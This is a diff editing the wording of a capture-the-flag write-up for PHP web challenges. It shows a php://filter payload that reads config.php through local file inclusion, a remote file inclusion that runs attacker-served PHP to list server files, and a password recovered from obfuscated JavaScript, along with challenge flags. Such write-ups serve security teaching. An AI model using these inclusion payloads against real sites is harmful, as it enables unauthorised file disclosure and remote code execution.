@@ -175,14 +175,14 @@ It directly gives user input to ```require```.
 
 https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/
 
-If we just give the file name the php in it will be executed.
+We can make the server require config.php, but the php in it will be executed.
 
 To prevent that we can use ```php://filter/convert.base64-encode/resource=config.php```.
 ```
 https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
 ```
 
-This base64 string will at the top of the page:
+This base64 string will be at the top of the page:
 ```
 PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgQkZTe1VfaDR2M19VbjAhISF9Cj8+Cg==
 ```
@@ -206,7 +206,7 @@ It says ```Flag is in an obvious html place.```.
 
 ## Solution
 
-Tried a few urls before trying ```https://noprotection.secu-web.blackfoot.dev/flag.html```
+Tried a few urls before finding ```https://noprotection.secu-web.blackfoot.dev/flag.html```
 
 It shows ```Congratz, you can validate with ZOB{y34h_y0u_f0und_m3}```.
 
@@ -243,7 +243,7 @@ flag: ```ZOB{3v3n_pr0t_c4n7_st0p_m3}```
 
 ## What it is
 
-Same as the other lfi, but we don't know what file the flag is in.
+Same as the others, but we don't know what file the flag is in.
 
 ## Solution
 
@@ -253,7 +253,7 @@ We can do that by executing code from a remote file ([source](https://www.php.ne
 
 ### Serving the remote file
 
-The remote code will print the files in the server's working directory:
+This code will be executed on the server and print the files in the server's current directory:
 ```php
 echo implode(", ", scandir("."))
 ```
@@ -265,7 +265,7 @@ python3 -m http.server 8080
 ```
 $ curl localhost:8080/remote.php 
 <?php
-        echo implode(", ", scandir("."))
+    echo implode(", ", scandir("."))
 ?>
 ```
 
@@ -286,7 +286,7 @@ This appears on the page:
 ., .., hidden_file.html, index.php 
 ```
 
-At https://remote.secu-web.blackfoot.dev/hidden_file.html we have:
+At https://remote.secu-web.blackfoot.dev/hidden_file.html we find:
 ```
 Congratz, you can validate with ZOB{sh0uld_h4v3_h1dd3n_b3773r}
 ```
@@ -301,17 +301,17 @@ flag: ```ZOB{sh0uld_h4v3_h1dd3n_b3773r}```
 
 It asks for a password and checks it with obfiscated code.
 
-At around line 9 (around column 662) we can see:
+At around line 9, column 662 we can see:
 ```js
 if(password=== input)
 ```
 
-And at column 597:
+At column 597:
 ```js
 var password=_0xf7f7[0]
 ```
 
-At column 5:
+And at column 5:
 ```js
 var _0xf7f7=["\x67\x67\x65\x7A", ...
 ```
